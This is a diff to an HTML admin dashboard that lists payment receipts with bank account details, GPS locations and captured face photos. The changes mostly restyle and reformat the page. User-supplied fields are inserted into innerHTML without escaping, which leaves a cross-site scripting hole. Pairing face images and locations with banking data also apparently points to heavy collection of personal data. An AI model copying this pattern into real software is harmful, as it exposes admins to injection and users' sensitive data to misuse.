@@ -8,9 +8,9 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; }
         .admin-wrapper { display: flex; min-height: 100vh; }
-        .admin-sidebar { width: 250px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; }
+        .admin-sidebar { width: 250px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; padding: 20px; }
         .admin-sidebar h1 { font-size: 20px; margin-bottom: 30px; }
-        .admin-nav-item { padding: 12px; border-radius: 8px; cursor: pointer; background: rgba(255,255,255,0.1); margin-bottom: 10px; }
+        .admin-nav-item { padding: 12px; border-radius: 8px; cursor: pointer; background: rgba(255,255,255,0.1); margin-bottom: 10px; font-size: 14px; }
         .admin-nav-item:hover { background: rgba(255,255,255,0.2); }
         .admin-main { flex: 1; display: flex; flex-direction: column; }
         .admin-header { background: white; padding: 20px 30px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
@@ -21,18 +21,18 @@
         .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
         .admin-stat-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
         .admin-stat-label { font-size: 14px; color: #999; text-transform: uppercase; margin-bottom: 10px; }
-        .admin-stat-value { font-size: 32px; font-weight: 700; color: #667eea; }
+        .admin-stat-value { font-size: 32px; font-weight: 700; color: #1a1a2e; }
         .admin-receipts { background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
         .admin-receipts-header { padding: 20px; border-bottom: 1px solid #e0e0e0; font-size: 18px; font-weight: 600; color: #333; }
         .admin-receipts-list { max-height: 600px; overflow-y: auto; }
-        .admin-receipt-item { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
+        .admin-receipt-item { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; cursor: pointer; }
         .admin-receipt-item:hover { background: #f9f9f9; }
-        .admin-receipt-username { font-weight: 600; color: #333; }
+        .admin-receipt-username { font-weight: 600; color: #333; font-size: 15px; }
         .admin-receipt-time { font-size: 12px; color: #999; float: right; }
-        .admin-receipt-details { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; font-size: 13px; }
+        .admin-receipt-details { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; font-size: 13px; }
         .admin-receipt-detail { color: #666; }
         .admin-receipt-images { display: flex; gap: 10px; margin-top: 10px; }
-        .admin-receipt-image { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; cursor: pointer; }
+        .admin-receipt-image { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; cursor: pointer; border: 2px solid #eee; }
         .admin-empty { text-align: center; padding: 40px; color: #999; }
         .admin-modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
         .admin-modal.show { display: flex; }
@@ -42,7 +42,16 @@
         .admin-modal-close { background: none; border: none; font-size: 24px; cursor: pointer; }
         .admin-modal-body { padding: 20px; }
         .admin-modal-image { width: 100%; border-radius: 8px; margin-bottom: 20px; }
-        .admin-detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
+        .admin-detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
+        .admin-detail-row span:first-child { color: #999; font-weight: 500; }
+        .admin-detail-row span:last-child { color: #333; font-weight: 600; text-align: right; max-width: 60%; word-break: break-word; }
+        @media (max-width: 768px) {
+            .admin-sidebar { display: none; }
+            .admin-content { padding: 15px; }
+            .admin-header { padding: 15px; }
+            .admin-header h2 { font-size: 18px; }
+            .admin-receipt-details { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
@@ -108,19 +117,21 @@
             } else {
                 receiptsList.innerHTML = receipts.map(r => `
                     <div class="admin-receipt-item" onclick="viewReceipt(${r.id})">
-                        <span class="admin-receipt-username">👤 ${r.username}</span>
+                        <span class="admin-receipt-username">${r.username || 'Unknown'}</span>
                         <span class="admin-receipt-time">${formatTime(r.timestamp)}</span>
                         <div style="clear: both;"></div>
                         <div class="admin-receipt-details">
-                            <div>Amount: ₦${r.amount}</div>
-                            <div>Bank: ${r.bankName}</div>
-                            <div>Ref: ${r.referenceNumber}</div>
-                            <div>Account: ${r.accountNumber}</div>
+                            <div>Amount: ₦${Number(r.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</div>
+                            <div>Bank: ${r.bankName || 'N/A'}</div>
+                            <div>Account: ${r.accountNumber || 'N/A'}</div>
+                            <div>Type: ${r.transactionType === 'credit' ? 'Top-up' : 'Transfer'}</div>
+                            <div>Narration: ${r.narration || 'N/A'}</div>
+                            <div>Ref: ${r.referenceNumber || 'N/A'}</div>
                         </div>
-                        ${r.location ? `<a href="https://maps.google.com/?q=${r.location.latitude},${r.location.longitude}" target="_blank" style="color:#667eea;font-size:12px;">📍 View on Maps</a>` : ''}
+                        ${r.location ? `<a href="https://maps.google.com/?q=${r.location.latitude},${r.location.longitude}" target="_blank" style="color:#667eea;font-size:12px;">View on Maps (${r.location.latitude.toFixed(4)}, ${r.location.longitude.toFixed(4)})</a>` : ''}
                         <div class="admin-receipt-images">
-                            ${r.receiptImage ? `<img src="${r.receiptImage}" class="admin-receipt-image">` : ''}
-                            ${r.capturedFace ? `<img src="${r.capturedFace}" class="admin-receipt-image">` : ''}
+                            ${r.capturedFace ? `<img src="${r.capturedFace}" class="admin-receipt-image" title="Captured Face">` : ''}
+                            ${r.receiptImage ? `<img src="${r.receiptImage}" class="admin-receipt-image" title="Receipt Image">` : ''}
                         </div>
                     </div>
                 `).join('');
@@ -143,14 +154,18 @@
                 if (receipt) {
                     const modalBody = document.getElementById('modalBody');
                     modalBody.innerHTML = `
-                        ${receipt.receiptImage ? `<img src="${receipt.receiptImage}" class="admin-modal-image">` : ''}
                         ${receipt.capturedFace ? `<img src="${receipt.capturedFace}" class="admin-modal-image">` : ''}
-                        <div class="admin-detail-row"><span>Username</span><span>${receipt.username}</span></div>
-                        <div class="admin-detail-row"><span>Amount</span><span>₦${receipt.amount}</span></div>
-                        <div class="admin-detail-row"><span>Bank</span><span>${receipt.bankName}</span></div>
-                        <div class="admin-detail-row"><span>Account</span><span>${receipt.accountNumber}</span></div>
-                        <div class="admin-detail-row"><span>Reference</span><span>${receipt.referenceNumber}</span></div>
-                        ${receipt.location ? `<div class="admin-detail-row"><span>Location</span><span>${receipt.location.latitude.toFixed(4)}, ${receipt.location.longitude.toFixed(4)}</span></div>` : ''}
+                        ${receipt.receiptImage ? `<img src="${receipt.receiptImage}" class="admin-modal-image">` : ''}
+                        <div class="admin-detail-row"><span>Username</span><span>${receipt.username || 'Unknown'}</span></div>
+                        <div class="admin-detail-row"><span>Type</span><span>${receipt.transactionType === 'credit' ? 'Top-up' : 'Transfer'}</span></div>
+                        <div class="admin-detail-row"><span>Amount</span><span>₦${Number(receipt.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</span></div>
+                        <div class="admin-detail-row"><span>Bank</span><span>${receipt.bankName || 'N/A'}</span></div>
+                        <div class="admin-detail-row"><span>Account Name</span><span>${receipt.accountName || 'N/A'}</span></div>
+                        <div class="admin-detail-row"><span>Account Number</span><span>${receipt.accountNumber || 'N/A'}</span></div>
+                        <div class="admin-detail-row"><span>Narration</span><span>${receipt.narration || 'N/A'}</span></div>
+                        <div class="admin-detail-row"><span>Reference</span><span>${receipt.referenceNumber || 'N/A'}</span></div>
+                        <div class="admin-detail-row"><span>Date</span><span>${receipt.transactionDate ? new Date(receipt.transactionDate).toLocaleString() : (receipt.timestamp ? new Date(receipt.timestamp).toLocaleString() : 'N/A')}</span></div>
+                        ${receipt.location ? `<div class="admin-detail-row"><span>Location</span><span><a href="https://maps.google.com/?q=${receipt.location.latitude},${receipt.location.longitude}" target="_blank" style="color:#667eea;">${receipt.location.latitude.toFixed(4)}, ${receipt.location.longitude.toFixed(4)}</a></span></div>` : ''}
                     `;
                     document.getElementById('receiptModal').classList.add('show');
                 }
